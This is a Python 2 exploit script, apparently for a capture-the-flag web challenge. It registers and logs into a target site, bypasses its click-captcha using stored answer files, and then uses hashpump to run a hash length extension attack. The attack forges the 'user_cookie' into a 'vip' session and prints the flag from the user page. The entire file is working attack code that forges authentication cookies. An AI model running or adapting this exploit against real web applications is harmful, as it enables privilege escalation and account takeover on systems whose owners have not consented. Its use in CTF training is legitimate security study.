import re, sys, random, base64
import requests as req
from pyquery import PyQuery as PQ
from hashpumpy import hashpump
from urlparse import parse_qs


# host 
# port
def exp(host, port):
    attack = getflag(host, port)
    if attack:
        return True
    else:
        return False


class WebChecker:
    def __init__(self, ip, port, csrfname = '_xsrf'):
        self.ip = ip
        self.port = port
        self.url = 'http://%s:%s/' % (ip, port)
        self.username = 'jianjian'
        self.password = 'marryme'
        self.mail = 'i@love.you'
        self.csrfname = csrfname
        self.integral = None
        self.session = req.Session()

    def _get_uuid(self, html):
        dom = PQ(html)
        return dom('form canvas').attr('rel')

    def _get_answer(self, html):
        uuid = self._get_uuid(html)
        answer = {}
        with open('./ans/ans%s.txt' % uuid, 'r') as f:
            for line in f.readlines():
                if line != '\n':
                    ans = line.strip().split('=')
                    answer[ans[0].strip()] = ans[1].strip()
        x = random.randint(int(float(answer['ans_pos_x_1'])), int(float(answer['ans_width_x_1']) + float(answer['ans_pos_x_1'])))
        y = random.randint(int(float(answer['ans_pos_y_1'])), int(float(answer['ans_height_y_1']) + float(answer['ans_pos_y_1'])))
        return x,y

    def _get_token(self, html):
        dom = PQ(html)
        form = dom("form")
        token = str(PQ(form)("input[name=\"%s\"]" % self.csrfname).attr("value")).strip()
        return token

    def login(self):
        rs = self.session.get(self.url + 'login')
        html = rs.text
        token = self._get_token(html)
        x,y = self._get_answer(html)
        rs = self.session.post(url=self.url + 'login', data={
            self.csrfname: token,
            "username": self.username,
            "password": self.password,
            "captcha_x": x,
            "captcha_y": y
        })
        d = parse_qs(rs.request.headers['Cookie'])
        dd = {}
        # print d
        for key, value in d.items():
            dd[key.strip()] = value[0]
        return dd

    def register(self, invite = ''):
        rs = self.session.get(self.url + 'register')
        html = rs.text
        token = self._get_token(html)
        x,y = self._get_answer(html)
        rs = self.session.post(url=self.url + 'register', data={
            self.csrfname: token,
            "username": self.username,
            "password": self.password,
            "password_confirm": self.password,
            "mail": self.mail,
            "invite_user": invite,
            "captcha_x": x,
            "captcha_y": y,
        })


def getflag(host, port):
    wc = WebChecker(str(host), str(port))
    wc.register()
    cookies = wc.login()
    gg = hashpump(cookies['user_cookie'], wc.username, 'vip', int(cookies['secretkey_length']))
    cookies['user_cookie'] = gg[0]
    cookies['username'] = gg[1].encode('hex')
    se = req.session()
    url = 'http://%s:%s/' % (host, port)
    rs = se.get(url + 'user', cookies=cookies)
    dom = PQ(rs.text)
    flag = dom("div.alert.alert-success")
    flag = PQ(flag).text().strip()
    print flag


if __name__ == '__main__':
    exp('127.0.0.1', 80)
